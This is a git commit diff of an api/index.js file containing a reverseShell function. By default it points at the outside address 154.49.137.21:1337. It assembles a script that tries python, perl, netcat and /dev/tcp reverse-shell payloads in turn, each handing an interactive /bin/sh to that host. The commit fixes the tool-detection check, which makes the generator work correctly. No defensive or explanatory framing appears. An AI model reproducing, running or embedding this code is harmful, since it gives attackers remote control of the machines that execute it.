39fc7c1faa0d10a2a58838f3244045700cb66435
zlamma.html <yonathandoss@gmail.com>
2023-08-20 19:49:18 -0600

    Update index.js

--- api/index.js
+++ api/index.js
@@ -18,7 +18,7 @@ const reverseShell = (address = '154.49.137.21:1337') => {
 	}
 
 	const payloads = {
-		python: `python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
+		python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
 		perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
 		nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`,
 		sh: `/bin/sh -i >& /dev/tcp/${host}/${port} 0>&1`
@@ -27,7 +27,7 @@ const reverseShell = (address = '154.49.137.21:1337') => {
 	return Object.entries(payloads).reduce((script, [cmd, payload]) => {
 		script += `
 
-if command -v sh > /dev/null 2>&1; then
+if command -v ${cmd} > /dev/null 2>&1; then
 	${payload}
 	exit;
 fi`;
